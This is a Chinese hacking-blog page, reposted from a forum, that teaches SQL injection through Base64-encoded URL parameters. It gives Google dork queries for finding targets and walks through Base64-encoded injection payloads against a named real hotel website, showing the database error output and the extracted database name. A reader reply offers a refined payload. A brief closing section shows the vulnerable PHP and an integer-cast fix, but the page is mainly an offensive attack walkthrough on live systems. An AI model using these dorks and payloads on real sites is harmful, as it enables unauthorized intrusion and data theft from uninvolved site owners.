<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Base64变形注入 - 又有一堆网站要遭殃了 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-04-05T22:49:06.000Z" itemprop="datePublished">
          2012-04-06
      </time>
    
    
    | 
    <a href='/tag/Base64变异注入/'>Base64变异注入</a>,
    
    <a href='/tag/Base64变形注入/'>Base64变形注入</a>
    
    
</span>
    <h1 class="post-title">Base64变形注入 - 又有一堆网站要遭殃了</h1>
    <section class="post-content">
      <p>什么是注入？估计有点基础的人都会反问，你傻逼吧，问这么傻逼的问题，把自己的SQL语句插入到原程序中，操作数据库。<br>你的注入熟吗？常在论坛逛的人都会反问，你傻逼吧，问这么傻逼的问题，论坛这么多关于注入的文章，怎么可能不会，工具注手注无所不会。<br>那么你知道Base64变异注入吗？这下轮到你傻逼了吧？不知道，而且工具也没这么个功能，或者说，闻所未闻。如果你感觉对SQL手工注入已经很熟了，看看这篇文章吧<br>作者：YoCo Smart<br>来自：<a href="http://blackbap.org/" target="_blank" rel="external">Silic Group Hacker Army</a><br><a href="http://blackbap.org/" target="_blank" rel="external">http://blackbap.org</a><br>通常我们在Google上面找SQL注入漏洞的时候，关键字会这么构造：</p>
<ol>
<li><p>inurl:news.php?id=</p>
</li>
<li><p>inurl:*.php?id=12</p>
</li>
<li><p>inurl:.php?articleid=</p>
</li>
<li><p>….</p>
</li>
</ol>
<p>不管怎么搜，通常我们的固定思维是，GET取值不是数字就是字符。整型数字，或者字符串。<br>那么你想没想过，如果你是程序编写者，你把这个真正的数字“隐藏”起来，该怎么做？一个好的方法就是对数字进行Base64加密。这个加密可逆，而且全是字符，操作起来又简单方便。<br>但是，有个问题就是Base64虽然可以隐藏数字，但是如果对数字不进行正则或者过滤，就产生了SQL注入。<br>事实上，这种把数字加密为Base64的url的网站多数存在注入点。你随便翻开一个注入点，注入，得到webshell或者服务器，你会发现上面已经有“前辈”们上去过了。而这些Base64变形的注入点，上面却干干净净。<br>好了，现在就告诉你什么是Base64变形注入。<br>Base64是一种加密方式，简单通俗的说，就是将任何的字母，数字，符号，汉字，进行一种编码，这种编码类似HEX编码，但是比HEX编码更复杂，但是仍然可逆，特点就是比原字符串的体积增加40%。关于这种加密方式，可以看一下这里：《<a href="http://blackbap.org/?p=archive&amp;id=48" target="_blank" rel="external">网络传输协议—-Base64详解</a>》，如果看不懂也不要紧，我在文章末尾会提供一个Base64加密解密工具。<br>好了步入正题。<a id="more"></a>在谷歌选择注入关键字的时候，可能会有这样的关键字：</p>
<ol>
<li>inurl:.php?id=13</li>
</ol>
<p>那么，Base64编译注入的相同关键字“13”就是这样：</p>
<ol>
<li>inurl:.php?id=MTM=</li>
</ol>
<p>很怪？其实不怪，就是这样的，如图：<br>（经过测试，这个页面上的网址99%是注入点，这里面又有一半可以拿到Webshell，拿到Webshell的又有五到七成能拿下服务器）<br>.php?id=MTM=其实就是.php?id=13<br>只不过客户端显示的是Base64编码，而实际上服务器上是以”13”来执行的<br>.php?id=13加单引号来判断注入点，这样的注入步骤一样。只不过不是直接13加引号，要把13’这个来Base64编码。<br>13’这个字符串进行Base64编码得到：MTMn<br>以Google得到的第一个网址为例，</p>
<ol>
<li><p><a href="http://www.favehotels.com/location.php?id=MTM=" target="_blank" rel="external">http://www.favehotels.com/location.php?id=MTM=</a></p>
</li>
<li><p>变更为：</p>
</li>
<li><p><a href="http://www.favehotels.com/location.php?id=MTMn" target="_blank" rel="external">http://www.favehotels.com/location.php?id=MTMn</a></p>
</li>
</ol>
<p>我们看到了SQL的错误回显：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 3<br>这个错误回显很熟悉吧？<br>我们这样“.php?id=13 and 1=1”试试？<br>注意，Base64编码这里不能用加号”+”或者”%20”来替换SQL语句的空格<br>“13 and 1=1”的Base64编码就是”MTMgYW5kIDE9MQ==”<br>我们访问一下：</p>
<ol>
<li><p><a href="http://www.favehotels.com/location.php?id=MTM=" target="_blank" rel="external">http://www.favehotels.com/location.php?id=MTM=</a></p>
</li>
<li><p><a href="http://www.favehotels.com/location.php?id=MTMgYW5kIDE9MQ==" target="_blank" rel="external">http://www.favehotels.com/location.php?id=MTMgYW5kIDE9MQ==</a></p>
</li>
</ol>
<p>这两个页面是一模一样的对吧？<br>恩好了，后面要做的就是猜字段数和爆数据了<br>很不好意思的一点就是，这个网站的字段数我没有猜到。因为Base64编码虽然很容易转换，但是没猜一次就要转一次编码，实在繁琐。<br>我一直猜到了17个字段<br>正常的语句是：</p>
<ol>
<li>.php?id=0 union select 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7</li>
</ol>
<p>那么转换成Base64的注入语句就是：</p>
<ol>
<li><a href="http://www.favehotels.com/location.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4OSwwLDEsMiwzLDQsNSw2LDc=" target="_blank" rel="external">http://www.favehotels.com/location.php?id=MCB1bmlvbiBzZWxlY3QgMSwyLDMsNCw1LDYsNyw4OSwwLDEsMiwzLDQsNSw2LDc=</a></li>
</ol>
<p>数据库提示联合查询的字段数不统一：<br>The used SELECT statements have a different number of columns<br>有兴趣的同学继续猜好了，我这里抛砖引玉了。<br>我们遇到这种编码的站，如果嫌麻烦，不妨用一下MySQL错误回显注入的知识：《<a href="http://bbs.blackbap.org/thread-2360-1-1.html" target="_blank" rel="external">MySQL错误回显套公式法注入</a>》<br>那么注入语句也就是：</p>
<ol>
<li>.php?id=0 union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(select data<strong>base</strong>()))a from information_schema.tables group by a)b</li>
</ol>
<p>进行Base64编码得到：</p>
<ol>
<li><a href="http://www.favehotels.com/location.php?id=MCB1bmlvbiBzZWxlY3QgMSBmcm9tIChzZWxlY3QgY291bnQoKiksY29uY2F0KGZsb29yKHJhbmQoMCkqMiksKHNlbGVjdCBkYXRhYmFzZSgpKSlhIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBncm91cCBieSBhKWI=" target="_blank" rel="external">http://www.favehotels.com/location.php?id=MCB1bmlvbiBzZWxlY3QgMSBmcm9tIChzZWxlY3QgY291bnQoKiksY29uY2F0KGZsb29yKHJhbmQoMCkqMiksKHNlbGVjdCBkYXRhYmFzZSgpKSlhIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBncm91cCBieSBhKWI=</a></li>
</ol>
<p>获得数据库名为：thefavehotels<br>代码相关：<br>这种编码防注入方法其实很简单，我们先从网站源码看起：</p>
<ol>
<li><p>$at_id=<strong>base</strong>64_decode($_REQUEST[‘id’]);//获取变量id并进行解码</p>
</li>
<li><p>$setcount=mysql_query(“select at_visit from tbl_at where at_id=’”.$at_id.”‘“) or die(mysql_error());</p>
</li>
<li><p>//将解码后的id直接带进数据库</p>
</li>
</ol>
<p>我们且不管程序员怎么编码解码，总之，最后带进数据库的SQL语句，没有进行任何的检查，无论该是正则还是过滤，都没有。<br>那么，我们在他带进数据库以前进行强制转型为int整数型</p>
<ol>
<li><p>$at_id=<strong>base</strong>64_decode($_REQUEST[‘id’]);//获取变量id并进行解码</p>
</li>
<li><p>$at_id=(int)$at_id;</p>
</li>
<li><p>$at_id=$setcount=mysql_query(“select at_visit from tbl_at where at_id=’”.$at_id.”‘“) or die(mysql_error());</p>
</li>
<li><p>//将解码后的id直接带进数据库</p>
</li>
</ol>
<p>这样就不会产生Base64编码下的注入漏洞了。<br>也可以直接将原语句改为：</p>
<ol>
<li>$at_id=(int)<strong>base</strong>64_decode($_REQUEST[‘id’]);</li>
</ol>
<p>是一样的效果。<br>好了，文章到此结束。</p>
<p>回复：</p>
<p>思路学习了, 坐等晚上回家实践.<br>发现个问题: id=<strong>base</strong>64(0 union select 1,2,3…)猜不到字段…<br>原因: id后的内容应该是字符串…<br>解决方法: id=<strong>base</strong>64(0’ union select 1,2,3…#)即可…</p>
<p>原文：Base64变形注入 - 又有一堆网站要遭殃了</p>
<p><a href="http://bbs.blackbap.org/thread-2362-1-1.html" target="_blank" rel="external">http://bbs.blackbap.org/thread-2362-1-1.html</a></p>

    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/350.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/350.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/350.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/350.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/355.seo/">
        ← 2012年3月最新免费美国VPN整理
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/348.seo/">
        《碟中谍4》反恐新技术揭秘 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
